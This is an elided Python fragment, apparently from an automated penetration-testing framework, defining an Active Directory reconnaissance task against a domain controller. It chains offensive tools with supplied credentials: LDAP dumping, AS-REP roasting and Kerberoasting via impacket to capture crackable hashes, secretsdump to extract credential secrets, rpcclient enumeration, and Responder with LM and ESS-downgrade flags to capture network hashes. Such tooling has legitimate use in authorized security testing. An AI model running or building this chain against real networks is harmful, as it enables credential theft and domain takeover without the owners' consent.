...
def ad_recon_task(self, session_id):
    ...
    try:
        ...
        rc, out, err = _run_tool('nxc_connectivity', ['nxc', 'smb', dc_ip, '--timeout', '15'], timeout=30)
        ...
        if is_auth:
            ldap_args = [
                'ldapdomaindump', '-u', '%s\\%s' % (domain, username),
                '-p', password, '-o', tmpdir, dc_ip,
            ]
        else:
            ldap_args = ['ldapdomaindump', dc_ip]
        rc, out, err = _run_tool(
            'ldapdomaindump', ldap_args,
        ...
        if is_auth:
            getnp_args = [
                'impacket-GetNPUsers', '%s/%s:%s' % (domain, username, password),
                '-request', '-dc-ip', dc_ip, '-format', 'hashcat',
            ]
            rc, out, err = _run_tool(
                'impacket_getnpusers', getnp_args,
        ...
        if is_auth:
            getspn_args = [
                'impacket-GetUserSPNs', '%s/%s:%s' % (domain, username, password),
                '-request', '-dc-ip', dc_ip,
                '-outputfile', '%s/spns.txt' % tmpdir,
            ]
            rc, out, err = _run_tool(
                'impacket_getspns', getspn_args,
            ...
            sd_args = [
                ...
                '-outputfile', '%s/secrets' % tmpdir,
            ]
            rc, out, err = _run_tool(
                'impacket_secretsdump', sd_args,
        ...
        if is_auth:
            ...
            rpc_args = [
                'rpcclient', '-U', '%s/%s%%%s' % (domain, username, password),
                dc_ip, '-c', rpc_commands,
            ]
            rc, out, err = _run_tool(
                'rpcclient', rpc_args,
        ...
        responder_args = [
            'responder', '-I', iface, '-A', '-wrf',
            '--lm', '--disable-ess',
        ]
        rc, out, err = _run_tool(
            'responder', responder_args,
